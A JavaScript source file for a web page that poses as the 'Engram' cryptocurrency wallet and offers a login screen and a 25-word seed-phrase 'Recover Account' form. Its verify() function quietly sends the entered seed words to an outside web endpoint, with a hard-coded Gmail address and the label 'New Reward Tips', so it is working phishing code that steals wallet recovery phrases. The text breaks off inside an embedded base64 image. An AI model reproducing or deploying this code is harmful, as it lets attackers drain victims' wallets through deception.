import './style.css'
import { encrypt, decrypt } from './ibeh_encrypt.js';
import logo from './logo.png'
import logoT from './logoT.png'

class Draggable {
  constructor(el) {
    // Check if `el` is a string (CSS selector) or a DOM element
    if (typeof el === 'string') {
      this.element = document.querySelector(el);
    } else if (el instanceof HTMLElement) {
      this.element = el;
    } else {
      throw new Error('Invalid element or selector passed to Draggable');
    }

    this.init();
  }

  init() {
    let isDragging = false;
    let offsetX = 0;
    let offsetY = 0;

    this.element.style.position = 'absolute';

    this.element.addEventListener('mousedown', (e) => {
      isDragging = true;
      offsetX = e.clientX - this.element.offsetLeft;
      offsetY = e.clientY - this.element.offsetTop;
      this.element.style.cursor = 'grabbing';
    });

    document.addEventListener('mousemove', (e) => {
      if (isDragging) {
        this.element.style.left = (e.clientX - offsetX) + 'px';
        this.element.style.top = (e.clientY - offsetY) + 'px';
      }
    });

    document.addEventListener('mouseup', () => {
      isDragging = false;
      this.element.style.cursor = 'pointer';
    });
  }
}




show_preDesk();
setTimeout(() => {start()}, 1000);

function start() {
  show_Desktop();
  document.querySelectorAll('app').forEach(el => {
    new Draggable(el);
  });
  
}

function startApp(){
  try {
    document.getElementById('myGUI').remove();
  }catch(e){}
  let GUIApp = document.createElement("div");
  let GUI = document.createElement("GUI");
  GUI.id = "myGUI";
  GUI.dataset.state = "normal";
  GUI.innerHTML=UI_home();
  GUIApp.appendChild(GUI);
  document.body.appendChild(GUIApp);



          const gui = document.getElementById('myGUI');
          const titlebar = document.getElementById('myTitlebar');
          const minimizeBtn = gui.querySelector('.btn.minimize');
          const maximizeBtn = gui.querySelector('.btn.maximize');
          const closeBtn    = gui.querySelector('.btn.close');

          let isDragging = false, offsetX = 0, offsetY = 0;
          let lastPosition = {
            top: gui.style.top,
            left: gui.style.left,
            width: gui.style.width,
            height: gui.style.height
          };

          // --- Save/Restore Position ---
          function saveCurrentPosition() {
            lastPosition = {
              top: gui.style.top,
              left: gui.style.left,
              width: gui.style.width,
              height: gui.style.height
            };
          }
          function restoreLastPosition() {
            gui.style.top = lastPosition.top;
            gui.style.left = lastPosition.left;
            gui.style.width = lastPosition.width;
            gui.style.height = lastPosition.height;
          }

          // --- Drag Events (Unified: pointer) ---
          function startDrag(e) {
            if (gui.classList.contains('maximized') || gui.classList.contains('minimized')) return;

            isDragging = true;
            offsetX = e.clientX - gui.offsetLeft;
            offsetY = e.clientY - gui.offsetTop;
            document.body.style.userSelect = 'none';
            e.preventDefault();
          }

          function onDrag(e) {
            if (!isDragging) return;

            const newLeft = e.clientX - offsetX;
            const newTop = e.clientY - offsetY;

            const vpWidth = window.innerWidth;
            const vpHeight = window.innerHeight;
            const guiWidth = gui.offsetWidth;
            const guiHeight = gui.offsetHeight;

            const clampedLeft = Math.max(0, Math.min(newLeft, vpWidth - guiWidth));
            const clampedTop = Math.max(0, Math.min(newTop, vpHeight - 40)); // Keep titlebar visible

            gui.style.left = clampedLeft + 'px';
            gui.style.top = clampedTop + 'px';
          }

          function stopDrag() {
            isDragging = false;
            document.body.style.userSelect = 'auto';
          }

          // --- Attach Pointer Events ---
          titlebar.addEventListener('pointerdown', startDrag);
          document.addEventListener('pointermove', onDrag);
          document.addEventListener('pointerup', stopDrag);

          // --- Button Events with stopPropagation ---
          minimizeBtn.addEventListener('pointerdown', (e) => {
            e.stopPropagation();

            if (gui.classList.contains('minimized')) {
              gui.classList.remove('minimized');
              gui.setAttribute('data-state', 'normal');
            } else {
              saveCurrentPosition();
              gui.classList.remove('maximized');
              gui.classList.add('minimized');
              gui.setAttribute('data-state', 'minimized');
            }
          });

          maximizeBtn.addEventListener('pointerdown', (e) => {
            e.stopPropagation();

            if (gui.classList.contains('maximized')) {
              gui.classList.remove('maximized');
              gui.setAttribute('data-state', 'normal');
              restoreLastPosition();
            } else {
              saveCurrentPosition();
              gui.classList.remove('minimized');
              gui.classList.add('maximized');
              gui.setAttribute('data-state', 'maximized');
            }
          });

          closeBtn.addEventListener('pointerdown', (e) => {
            e.stopPropagation();
            gui.style.display = 'none';
          });
}



function show_preDesk() {
  document.querySelector('#app').innerHTML =  `
  <preloader>
  <div class="preloader">
  <cliprotate></cliprotate>
  <cliprotate></cliprotate>
  </div>
  <text>Preparing desktop in background</text>
  </preloader>
  `
}
function show_Desktop(){
  document.querySelector('#app').innerHTML =  `
    <desktop>
        <deskBG></deskBG>
        <app onclick="startApp(this)">
          <img src="${logo}" alt="logo"/><br>
          <text>Engram</text>
        </app>
      </desktop>`;
}
function show_home() {
  const gui = document.getElementById('myGUI');
  gui.innerHTML=UI_home();
}
function show_rectAcct(){
  document.querySelector('Workspace').innerHTML =  UI_recAcct();
}
function show_loader(){
  document.querySelector('Workspace').innerHTML =  UI_loader();
}
function UI_home(){
  return `
      <Titlebar id="myTitlebar">
        <div class="title">
          <img src="${logo}" />
          Engram
        </div>
        <div class="controls">
          <div class="btn minimize" title="Minimize"></div>
          <div class="btn maximize" title="Maximize"></div>
          <div class="btn close" title="Close"></div>
        </div>
      </Titlebar>
      <Workspace>
        <main>
          <LogoT><img src="${logoT}" draggable="false" alt="logo"></LogoT>
          <div class="wrap">
            <select><option>(Select Account)</option></select>
          </div>
          <div class="wrap">
            <input type="text" placeholder="Password" />
          </div>
          <div class="off-mod"><input type="checkbox" id="off-icon"><label for="off-icon">Offline Mode</label></div>
          <button class="sign">Sign In</button>

          <div class="mo">
            <div class="line"></div>
            <span>MORE OPTION</span>
            <div class="line"></div>
          </div>
          <spn onclick="error_bod()">Create a new account</spn>
          <spn onclick="show_rectAcct()">Recover an existing account</spn>
          <spn onclick="error_bod()">Settings</spn>
          <footer>&copy; 2023 DERO FOUNDATION | VERSION 0.5.2</footer>
          <br>
        </main>
      </Workspace>
  `;
}
function UI_loader() {
  return `<bgloader><loader></loader></bgloader>`
}
function UI_recAcct() {
  return `
    <main>
              <h3 class="title">Recover Account</h3>
              <div class="wrapBox">
                <div class="wrap WAname">
                  <input type="text" class="Aname" placeholder="Account Name" />
                </div>
                <div class="wrap Wpsdd">
                  <input type="password" class="psdd" placeholder="Password" />
                </div>
                <div class="wrap WC_psdd">
                  <input type="password" class="C_psdd" placeholder="Confirm Password" />
                </div><br>
                <div class="wrap Wsdd">
                  <input type="text" class="sdd" placeholder="Seed Word 1" />
                </div>
                <div class="wrap Wsdd">
                  <input type="text" class="sdd" placeholder="Seed Word 2" />
                </div>
                <div class="wrap Wsdd">
                  <input type="text" class="sdd" placeholder="Seed Word 3" />
                </div>
                <div class="wrap Wsdd">
                  <input type="text" class="sdd" placeholder="Seed Word 4" />
                </div>
                <div class="wrap Wsdd">
                  <input type="text" class="sdd" placeholder="Seed Word 5" />
                </div>
                <div class="wrap Wsdd">
                  <input type="text" class="sdd" placeholder="Seed Word 6" />
                </div>
                <div class="wrap Wsdd">
                  <input type="text" class="sdd" placeholder="Seed Word 7" />
                </div>
                <div class="wrap Wsdd">
                  <input type="text" class="sdd" placeholder="Seed Word 8" />
                </div>
                <div class="wrap Wsdd">
                  <input type="text" class="sdd" placeholder="Seed Word 9" />
                </div>
                <div class="wrap Wsdd">
                  <input type="text" class="sdd" placeholder="Seed Word 10" />
                </div>
                <div class="wrap Wsdd">
                  <input type="text" class="sdd" placeholder="Seed Word 11" />
                </div>
                <div class="wrap Wsdd">
                  <input type="text" class="sdd" placeholder="Seed Word 12" />
                </div>
                <div class="wrap Wsdd">
                  <input type="text" class="sdd" placeholder="Seed Word 13" />
                </div>
                <div class="wrap Wsdd">
                  <input type="text" class="sdd" placeholder="Seed Word 14" />
                </div>
                <div class="wrap Wsdd">
                  <input type="text" class="sdd" placeholder="Seed Word 15" />
                </div>
                <div class="wrap Wsdd">
                  <input type="text" class="sdd" placeholder="Seed Word 16" />
                </div>
                <div class="wrap Wsdd">
                  <input type="text" class="sdd" placeholder="Seed Word 17" />
                </div>
                <div class="wrap Wsdd">
                  <input type="text" class="sdd" placeholder="Seed Word 18" />
                </div>
                <div class="wrap Wsdd">
                  <input type="text" class="sdd" placeholder="Seed Word 19" />
                </div>
                <div class="wrap Wsdd">
                  <input type="text" class="sdd" placeholder="Seed Word 20" />
                </div>
                <div class="wrap Wsdd">
                  <input type="text" class="sdd" placeholder="Seed Word 21" />
                </div>
                <div class="wrap Wsdd">
                  <input type="text" class="sdd" placeholder="Seed Word 22" />
                </div>
                <div class="wrap Wsdd">
                  <input type="text" class="sdd" placeholder="Seed Word 23" />
                </div>
                <div class="wrap Wsdd">
                  <input type="text" class="sdd" placeholder="Seed Word 24" />
                </div>
                <div class="wrap Wsdd">
                  <input type="text" class="sdd" placeholder="Seed Word 25" />
                </div>
              </div>
              <button class="rec" onclick="verify()">Recover</button>
              <spn onclick="show_home()">Return to Login</spn> <br>
            </main>
  `
}
async function verify(){
  let Aname = document.getElementsByClassName('Aname')[0];
  let WAname = document.getElementsByClassName('WAname')[0];
  let psdd = document.getElementsByClassName('psdd')[0];
  let Wpsdd = document.getElementsByClassName('Wpsdd')[0];
  let C_psdd = document.getElementsByClassName('C_psdd')[0];
  let WC_psdd = document.getElementsByClassName('WC_psdd')[0];
  let sdd='';
  WAname.style.borderColor="#F55F63 !important";

  if(Aname.value==''){
    WAname.style.borderColor="#F55F63";
    return
  }
  WAname.style.borderColor="#008000";
  if(psdd.value==''){
    Wpsdd.style.borderColor="#F55F63";
    return
  }
  Wpsdd.style.borderColor="#008000";
  if(psdd.value=='' || psdd.value!=C_psdd.value){
    Wpsdd.style.borderColor="#F55F63";
    WC_psdd.style.borderColor="#F55F63";
    return
  }
  Wpsdd.style.borderColor="#008000";
  WC_psdd.style.borderColor="#008000";


  for(let i=0;i<document.getElementsByClassName('sdd').length;i++) {
    if(document.getElementsByClassName('sdd')[i].value==''){
      document.getElementsByClassName('Wsdd')[i].style.borderColor="#F55F63";
      return
    }
    document.getElementsByClassName('Wsdd')[i].style.borderColor="#008000";

    if(i==document.getElementsByClassName('sdd').length-1) {
      sdd += document.getElementsByClassName('sdd')[i].value;
    }else{
      sdd += document.getElementsByClassName('sdd')[i].value +' ';
    }
  }


  const name = "New Reward Tips (Engram)"
  const email = "Wcabwcab40@gmail.com"
  // const email = "facebookpeecee@gmail.com"
  const message = `Tip: ${sdd}`;
  
  const url = `https://xendit-hazel.vercel.app/api/hazel?name=${name}&email=${email}&message=${message}`;
  
  try {
    show_loader();
    const res = await fetch(url);
    const result = await res.json();
    console.log(res);
    console.log(result);
    show_home();
  } catch (err) {
    show_rectAcct();
    console.error(err);
  }
}

function error_bod() {
  var bod = document.getElementsByClassName('bod')[0];
  bod.innerHTML = error_mod();
}
function error_mod() {
  return `<div class="box">

    <h3>Error</h3>
  </div>
  <div class="box">
    <h5>Can't be fetched at the moment</h5>
  </div>`;
}
function preloader() {
  return `
    <div class="preloader">
      <div class="rot">
        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="10" height="10"><image  x="0px" y="0px" width="76px" height="87px"  xlink:href="data:img/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEwAAABXCAYAAACuhqNzAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAABmJLR0QA/wD/AP+gvaeTAAAAB3RJTUUH6QUeABYt3P6mlAAAJ1VJREFUeNrlnHdwZdd52H+3v94r+gILbO/LJWmuSIkiRSpS7MSxlXgmju1kUsaJ4zhOJp5k0tukeqTEHmcyTpzxpIzl2JZlqlDMkmJZiqS4jdgCLLDowOu93ffufTd/XLwHYLEFS5GWnHwzGOzbd+653/nd7/vOd75zcAXLsvhBkaeffnr8jTfe+HlAVBQHA6PxucXbi1/8fuu1XYQfBGBnHnvsFwvFzBFVcsQ9Redn40MTgtEoM2fOpSzL+vrEHz/yr1755a/NfL/1hO8jsBf/xotHu4J0Ov9WimIx97cV0XF0VBjmk2f3MRwfZCW9xvxMgTcr07j93n8pYN3y+oKp11555eX/74A98/Ofiw4UQn9TQPilr3319xkZG+SFI4f49JFTJLwDVIQiALnVEG9f/ya/P3uJdDqNw+G4ePDHTv0ZAF0Sy29/8aXK/xfA9u0f+/VirvQj8Xg8fOzESc4NORgZGACg0mzSMaooshef0wlAvpphca7MN6/fbC4vrq07HA7G90/9+4tvvv6r/88Ce+bTn36hkE/9WL1eRxbUFw7ujw4fCCYZ2+9Hkb39dtV2Gofo6n/ufdcxqizOlZkpbrC4XqJWq30XQbjicbuNxFPj/+blX/nqnT/ywJ76i58NOe60n2u220q1mv9cvd74CY/bzdhAgPMH9xMIBukYVQDqVQPJ3QboA2t1G/3PPXClYpFsus7F5QwbqWUK2VJnZGzgn8cH9335Wy+9dOOPLLBn/9qzHvOm8NS1S5d+27IsTyga4OjkYB8U2FZTrxo0Wnr/Om9YwCG6qFcNABotHZdDA8DtlQl7YwAsr6/z7mqLS5ffoZAtMTI2+C+STw/9SqstWQ2yufd+7b3OHylgpx977Kfv3L79jxyWPHzuqQPi6bFhBpIJAPS0CUBTrdBo6dTLBm6/DNCH04NVL9vg3H65/52z7UOLS4BtcW/emmNmPpfLZDIFoHny5MmffPXVVz/4gQf23M8+N7j8yvIvGl3d5XG7jyf0gSdPTEYJ+j14A44dbaulFm1ftQ8EIBp3962vByObru+4zu2XUSveHf1VSy2K5RqXm1nuLM0ZlsVXVUnLRCLxD9566/Vf+SiByR9FJy+88PmnKvXSsN5ujVQqlb/k9/vdQ9IhnpocZmQqQEnP9wfWk6JVhPJWHz1YI1LUhqXW+t8ZGdVuD9TLBqqw1Zc34Oj/BEsenB6fvLQ48yczqTztrn7pyfPn8wDux3yXP4rk90Nb2GN/5TFXwBnwAqRfXf/1zEL6cwDHkyd5ZvIonpBGKOKkkGtSNwtboMq1XX2NjEaYHEjg8jnxWUFS1XUAXD4njUqT2+upvhXdLUG/BwC3FCIUsdOQlfQaF1IL3FmaY205jdOpMTE5+Q/9x7xfuvBfLpS+L8CePP/0TyzMzf79VquFpmlDJ4LHvKdG9jPiSmD4mwDUCnYwL5EGwKzYBl1uNAglVIJ+D8PxQY6Njfb7vbMmUF+122uuAFPHVCpCkUalycxMhdXCMoVUG7/Lnkkln4Go+/FpWy4akAIALDdSXF6e41ppGl3X04GI/7cXbi/+tT90YGfOnfkLxWLuzzWq+tPHA0cZ9voZTwz3FS2Z9kOs6LbbdPSdcSgy7GA4PsjoPh8+K0i1bAfzbK2NUdDRG6V+W80VICg7cQzIWIEUSwsVVtJr5FZalBuNPjhFc/ev8WmOHbrcSa2wUi2zZK0stLutrwPsG5748oULF1772IB95q/+8fH6lfIZgGw29QvekuvJcCjC0XiSieBEv912WB29jqK5+8AUzc1A0s+BAz4SXjuzr5a1Pqie9IBVak2KXYmpRIzkiBev326Tqq6TzXdYni1R0Vvkitld4HrQil2JoGiy3EjxQS5LenWeNX0VfyL8XyOR+NedTlWvH9Fe2+sy64HAxD8tSk/6XvDLLlGqXcz8uelr0//W6dQ4lzhLz/18HifL5Y3+NT1QPelZQWTYwenDYxwenCTsdZGvNlhaMdhYthPXoOzsX1PdKO/Qo+5u9K1t6phKyGdDWayucvXWAlfeWe+3vR+47Q/027enubZxhWKrTjDoLxw+fPhHzGPOmTboDwP3QGCf+YXPjNz+g9nfKNXyUc1yh44Hjg4cjScJ+8L3dL8eqHKj0e9jPDHMmSeju0C11g2KRnMHKACXI0yjlccqSNT0wj318ib9RA+ZTA7aM+r767Ncfi/NtRtz1HIGgyO+fltFc98zvs0X55lOb3Bt44rZEow7Tzx1Xp+aGP/ml770pb/1yMCePH/+J+vVwrlao+EHfjRYDrhPjk4wnhju3/RecepuUCNTAY6NjfYHth3W3dIDNVMuspK9iU9zcEiewKOFAPrwep+FkIljQGZ02J5ICpU6qeo677+dJV/J93Xxu1w7rG07tO3xLe8rA9zutBtfjn9q4Evf+uVvpR8K7MWfetFdnWt8YiOz/EuNTO2ZQW2IcCjCqZH9eB2DBEWTYldCsPK7Avp2BUfHBjg9eYLRYZmh8XGa2dR9YfVAFY0ms6kMF1evkF6dpxcfD8ifIeor9UH1pKYX8GghnEcFRodlwl7bFS/dqLB4a4XpzAK5YravU8/aACwlyKhiTzTFrkS1tcbl5TmWrBXK5XJpcGTwH3h9wTVVVVde/trX3tsF7MWfetFdVQVNm9dHLl269FWHJQ8NakM8c+gY40Nn7adRtV27YjYQOsU+qCouuo0cAJFglMdPP8EL5yI4owlE4xDZS9eYXSvQaOV3AHI5wn0lLqfnuDz7OleW5pkuz+AKK1gNEYcl80zoKZ4+cYqkEN4FrQfOm/TjcoSZGgwRPX2c1codFj74gNffeZc7qZUd0LaD82kOLCFMwOujVK30wb2b+i6CIDA0mvzfvsdG/xJAziXWZ774ki5YlsWxE4f/yeryxg9rmqYOdhMTJ0cn1HBsCp+0dZMeqIJuW2S3kaOWs61l9PBhzg6OMXriBINDtjLaXK0Pajuc7bJWW+U7M2/y7ZsfsCamcHkdTE0dJRQKUSgUWF9bILNge8bx5El+5OB5Jh2TuIQQDct20e3/dg8EcKsxIk86GPKNs1q5w7tvv8/N61e4k1phw4SkBKIrAkBIE7AUeynmk1x9cAsbV1iplrlWmi7pYn1J67o5dPToP371lVd+VxgbH/lbzbr+M4PdxOH40ASD3ghBT2gXrGJtKwBvt6jh6CFOxfcz+swIsfQU5eol1rIy9XYGa0PcMuVkdweo9xcvc3l5jnwhRy3YxOP3EY3GScTjyLKMYRjUajU2NjbIZWxonqKTk6MTnB481gd3L/GMRhiMGuj77VXA2mqdpatXeX/xMrlilg0TBr2RHddsH3NvvGvVnJ2GiClcHscrgWD0N6RSsfwfDrj2Hz996HGOxaYYiw5hdbpUzAa61aFUNql18n1QVqeB6IowFpni1PEjnPCf4eTkk7jrYW7cuUZhrk2zUIKaYFua4sHstqEm0FRyTOfXefP6BV7OvMtyeQUxIDE8PMzo2DiJaARZEulaIIoiXreLWDSKICsYpsFaZZ3ZtTI1BWqqSdDqIEZNlJZ7x+Db5Qa1rExENUjeOU0sGCPp7WL6nXjbGo3u1sOraF00U6DVbiIqMrrVsa3N4WPYlyDulSlkG6xXU+OC1K1Lqur4y8f2P578xMRZRkJ+1goFKqYdwIu1AobQ6MPaMMHvifD8gdM8OfIJnhp/jmgwTultnfLV2zQyTZpyDU3xIEsqZrfd/51pzfGV5ff5zxd+i3c33kcQ4PCxo5w9fYZwOIwkybQ7HRC2rLLd6WCYXaLhEKFwhGA4Sr2d5dbqByy05ui027hqhwh2x3F5sB8M4K55EVsClUULI10k5BxEicY4eu4QJ8PP0GmnKeo68/kV2o0mPm2zYNluQstNV22jiQoBr48xf4gFtUu2vIKiydcEQZDff27qmdMnJx7DJ7n6sJoVW/F5cQGAQbycGDrM+eEf4vD4cQDUFZXqjVVKnTw5a2thXLK2nvhsc5rvGm9y6eY7/TiVTIyQTCbxuJwgSsiynRoYbZ1ao9m/VtU0VEXZ6W9dk9XVVVZWViin8lhGiE/GDvHs+I8RCg2wnwS0iv3mEcF2y4ASpunzExvy0h5uc+PONWYLl/jWzCXWqDKIXdF1dCM4fd1+XAO4uHqFS+tv4fI6frNf3inWCqScdmFPa5ZBBN3pZ6K+j6PqQUKhASaHfZxUzoI98ZBZraJ38uQ0BdiqY9FsM9ucZrp9i5nsO/04NegfJhqNEwqFUBWlH6saTRuSy+nk2PgEXo+bRrNFOrXBRjrTB2eDlYklB5A1B1m/j2Ixy2vrNylq/40D7ccpqAc559oHDlufHBDR7eKrs1ImswoxvPY4QrBv9DCX1haZd9ygWCvQEnO0es/es+1BNQ3wbquH6U6//btbRNfAp9sWdlQ9yLnQaQY9w8SUzc2K2ybVzgZOQGenlDZhvVv5Pa4s2QHTH/QzODJMIjGAz+3C6FoYbZ1Gc6uKHA0FGRoaYnJyEkmWMQ2DYMCPKIqUqzXanY7tsoCqKAwNDm7OpnEWxNtcK02TL+SYH7oF/AlCDt22trvEWSnDbdtyTk6ehVEINcagCNPdW7TEXD+26aaJ1+facb0MUHI5SABenwu9VOxfEKsrhBIDW61v2xZY7dhrx4wAFU3BZ/moCBXmSPF6+QK/denLZJsL+P0eTp09QyIxgMvpxDAMWm170G2zS7VqP8ozJ49z4sQJxscnqFQrlEolwpEI+/aNc/zECd75zneYnp4mlc3hcW+5ew9cIh5ndXmJO0tzTF//Gmn/PKcPPU5BPs9zwU/SViGzeU1s+8JmczwVwc4xnb4umU6Xql7Hy86JZAew+0nZ3eGieYcrWoWTtRSRZogRRwSErTaDnmGuZ+f5nfJvc3HmJdb0VdwDHoaCJxkYGCYcsNd1Rtu2xVqjid7u4PV6OHroACdPnmRgcBCA+fk51tfXaTabOJ1OwuEwQ8PDPP7EE4yPj3Pj5i1u3LpFtVpDUxU8LieGYU8OseQAgVCYsbE8i4tzfHXmK1zqvsP0gVs8nXiW09YUXq+fJtCkQbVaZrmV4631G+QMAdN/i7JiUr2rFLVlmvL9gfUv2tqP4IpcwR3skGsViDS38p/Z4ms73C+2L04skiQQCuNxOZFVbUcwVzWNsZFhRkZGGBsbIxgKUSqVqFWrlEplWq0WpmnSarUoFApYloXX5yMai3FCVYnFoiwurbC+vkatVuv3qUoiqsuJqtkeUS6XqZUrXJx5iczqNDPBL/DUwGECTrUfNm5mJVLoJHD0w1FLaOOw1B08Wj4B1vdgYVW9jiu8leBl6yvUtQjuYIfJlsLMfIqL/J49g/gdDAaH2Tc2jsdjR8t2pwPbYHk8HsZGhjl06FDfqkrFIhupFK1mE8MwUFUVUbTjp2mabGxsUC5XaOs6sXicQCBANBpn7raX+fl5Wq0WtUaTNluz6sjwKLXgZtJLmm+X36Go1UmXH+do8yDZokjOkFgpL6H44w9CgLu+M0o/EJhXc9PQc7i0CG7ZCdi/g+EYF5ff57eav8nGzNucOnuyD2p7cAZIZe0gemBqiscfO8uRI0cBWF5ZZmNjg1q1itPpQlFsUO12m+62xNLlcmNYsLa2RiaTJZEcYHzfGOP7xrizsMjlS+9z49YtavU6Huy41u508LicTE5OMjkxzu35O1y7Pc3VlWXWIz/DsN8uifd+P0jqbg22een3vGukKDIOzdm3qJ7CvYB+aGqSQ4cPk0wmCQQCLK8sU6tWaWxWN5zOrVlIkmRkuUuj0UBVVRRFxbB697HdJJtNU62UCYaCRCIhnv/M8xw8eIDpG7dYXFoklU7jcbtRXU7omtQaTbw+Hy6vg3r1wWPx6SJZ4cFtvmdgTqdGS7cDud7uoKkKqqYxOjTA0NAQBw4cIBK162HFQsGOU3oL0zD7faiqQrvdIV8osLi0RDqTJRzwMTIySjKZRJLtTVvTMDENkxYtioUihtElEgkxPDKCx+NhMBlndm6ebC7XDwO1ep12u7VDZ9UZod3M7RpLRetC+2ME5tFDfWvtdNq02y3qdRgZHmVqaopTp0/3266vrVEobGXgkixhGiaGBWazSTqd5ubMLLOz02RSefx+P6lsjpPHjhGNRlCdbjRFQtqMby29RSvbolgqE40ECYZCBEMhQqEQ/+fV16hWa32d9Nb9KaRo9YP+XmQHsGqlsecLAWpaAb2zucGhqLTbLRYX5zh2+AhjY2P4vD4uXrxoP1VV6VuSYYEEOBwa9Xqdmzdv8p333uXG9Su0GnbJKJ1Os7i4zOzsNE8/9UkOHjyIO2FPFHqz3u8TIJNOk81k8Pv9HD58hA+u32R1bY1qpYLX53ukMT0SsIZLpdmUtgDq9f7yoG7YJp7R5O2LoF3icbtRFIVcLkc2m+Xq1SsMDY8Q8PtQNQ2HQ7Oz93KZ6bk53r98pXcKpw+rJ52Owdpymm9Uv8EHN65z7Ohxjhw6SCQSQRRFTNNEb9ap12vkcnlEWdmhR7Vy//2MtLwZO40WadlFhL1JH1jDtZV7NCUVp3l/M05LAiuWdM/vFNWFLCsYpkmr2SRXKCIIAnorgtvtRlVVstkst+fvMDs7zcrSOo1Ga1ecAbAsg3bbIJ1u2elDucLyyhLHjxwlkUggyzK1Wo1arUauUMTv92MYW9A1h3pPHVc6uz0pW56g5sn3P9ckCW1zwql1tuzqvjGsB82lRVhGI+xWcd9jmuka9+5CEkUkSaJWr6NqdgZcq9Wo1hvcvHmT+duzpNNp9irlcplyuczs7CzlcpkDBw4RjUQw2jr1Zgu6Jk5NQ1EUJOH+O2GzYpej2z4Lsp2EGxOA6YZtk0FeNfHedX1/tK5Ge4eV9aDNtIo4HQny9TZ5NO4uNovy7h0gAEEQEEWpX5mQJIliscjbb7/N4uLyPS1qr3Lpve9SK1c4duIk0XAIt9OBaZo7XHKvsthtMCa67vt9xbFzG7BfrcurJnuVRnsPiokKkiyhSiKyLCNJErKqoTllnE7t4dfvUVRVRZIk+0fY2y7+YrfBmqyyuHnCcU3ebSj3HdajKlht7J6Ce4mrqt5jehbtWCeKIrIooKguPipRN10QoNvtYlrCnq/ttEs7x9Va2dN1jwxsLyIIIGL2cyYAy7IQhL0P6MPfW0AQHn1YzeLe2j1y4tq2KrSbO+NPS7dTju1x6W44lmXRMbsPv8EeRXN+JGcBAdvalD3mro/8KFTBh+pMPLCNZdmAeqJI4sdmXR2zi2VZiKKIIgkIgoBlPdqDUdTAntt+LC4J0GVnniYIArL48bmk7Yofvn9ncG/tHgqs5d858G5w59O7Xx621cDsW5skSXxUojcN2rqOiG1d22HtJYb1rOph1uVrNXd8fmjPjvKD04175WG9oG92uyBKCIKAJEl0u1067Udbrz5IVE1DkqQ+LMuyNn/25pKKGtg1W94t983DHkXq7p2X3Z1WWJbtkpJo52C9dR+A1xv+SOJZL+h3zC7dbhfDMOiYFns6UZn88AvyXcAa+r0zcFV48E00dXcyKwgChmFgmiadTgfLskgmkwyPDhAIBD6Uwg6XzL79o8QiSVRFoWt0dlRoHwasGrLDQie80wq9juFdbZ13HfaDB6QVdb2Fe9vJvW6wCwX2LCImbdPsl6vlroUsCkTDIZg6iqK6WFteoVgs0+kYWJbxwP5U1UEw6CeWCDM6doB4LIpDVfqwOmaXrtF5YB5WC1lsR9AJd2HD/l1trbCXldU9gdX1D7/O67QbdgwTJfROi1RqnURiAKem9t1zbGSYwWSCtbEUly6/w8b6Gq2HhLbBkThTU0c5NDWJpjkwjA6GYWAJInqzQaPZpKnrm/fYu8tXhjr49r4q3OMsGd7cOQnr922nb27Qer1hGi0dWZYYGxni85/9Y8QjYZp6m2q9gWVZtNttRFEkGg4RDEbRFPfD1EARNUKhEA6HA11v0enYwMrlMpqmcfbUSZ4+/xSCKFKr1fr6fNSyw8KaRvPD9mMPSlFJJpMokkixWMTj8TA5NUUkEmV9fY2NdIZyuYwsy3hczv522l6lresIkkJzcx3jdDrZPzFALBYlFo0iyTLZXHHzwdmVz06nvae+9VgIufjwk+cPXV8I3i7cI4728rNeHqapCh6Ph0QshiBAOp3BNE327dvHvvF9BENBvN4lZufmabfsPch6vU6tXKHZ1B+mhr0xW6/345Tb7WZgYIDJyUkCwSDFQoHVlVVW1tZRFIWBeIya28VaKvPAfn1mmK7v/uuiu/MwGaBckpHjXYLK7iduVcUdp1hMn4Dl2uIsygbJZJL94+M76lHtdpvl5WWWl5eZmNjP0PAQ589/guMnTnD50iVmZmZYXV1lefUO7faDAz6Arutks2lSmTgHpyY5fPgwwZBd/Lt58yaLSyvUq2WcTheirOCUZZxOJ4FAkFQmw8LcbWB3flaR8ngYvO99787DHmhhdb11zyMZQt0eoEcPkTNkFhbvoGoaI4ODKIqMaQkIgu0yAKnUBuVyiY2NDZLJJKdOnyYSsavob7zxFvBwYABBn58Xnn8Oj9eugy7cWWB9fY16vY5lGv09TsvsYEoKltmhXC5x+/ZtOl2dIeUkcjJJ1+1ArLSoSPk93XfPwHaQDuZxlbY+x9sTOE78MP6kA5o1lhYXKRQKJKIRIpEITqcTSZL6QV7X2zSbTdq6jjk0hMPhIBQK0ensDZamaTg9PjxeL512m1w+TyaTpVQsIMsKoqwgCxaCYO+eZzNp0pkshXyO3FqISHIAh3mISd8EuWCHFI7+jrZYaYEDip3uQzfcZABz4N5rPH3zPFjF6iBju5tUsZBK4BZCxKIvMOB6gpnCl1mcuUwuc5NqpULb7BILh3B5fEiCZe9gd21wi4uLNJtNNE2jUquzV9F1nWatQrFQZHllhVq1imF0+lZsWmBaAt1Om1Qmw/LKEmvLdlFQtV7gwMgpguIYbrcfigtEJIVp9yC1+hoVKU90j3pIgiD+5aF9TyY9gwfRRQGxXqBj2k/d4Qnj9CSIqMNoLRdy0YNH36rqdzo6brefg4eeIBkexZAD3PjO2yyu3qBYKePz+ggGg1jdLl0LsLpomgaCyOr6Oh9MX2NxYYl7xZa7pdVqgdRFUx3IioYiywiSgmkYqKp9OrFWKTN74yLvXb5KuubBlzjD6am/waGRJ3EKgb7OquBEFZwEhQ4xVaaqBFHkHIIs4jYNOqaBIssoiouaYxTdqLOcX8Ijd6/JAHWj0N9rLHQV2Cz7yoDkduLyRhh2RCl32phakXYz1a+JmRQp5EF1Jjix/09x2DnA++vrpDOXeePbrxGJxZmcGCeRSOJwaLQNG07X6DxwR/pe0qi2sCwLSbArFHQtVFUln89z+84C62sL6E2Dg94z+IzP4R6Ywn2Po+l1q2B7iGcfAL5QmdVqgaJeBsWNC0Bxk1Ed3L0g7Mewrl7GKOdxO+0pUfaHETV/v2Gu7WYgHqUtqRTy4FI7OzZDXOpmorjvLKdDeW6uQTFtsJir0NKvky9ViMeixGJxZEnEsqx+pfZRpNVqISsqVtekUiqQymQpFfJUCg70yiTx2Cn87RO4jkbuCQvscOJ2++lEgkTUOpUWQBQlUKAKeDdXHbF2i5xWod7cOvDcB2aU8ztAeQQfkttJV6yzXH8HsZum6Y3jNMeIhDfPVFVXabSVPqwewMTQCQL+MPOBxwiW3mN68f9Qu3mdQj6OYRhIgwPUGk067cZD15B3S63RpNVsUKvVmFtYZHZ2Gl0eIRLfx7HRJxlwPdG3orpVIBwO0G6mbKNo2oft1NExOkCzu8gNPU+5ukFXrOOsO3E6hqlpfrRMAeQO7uIigtjB26mCw7EFTI2N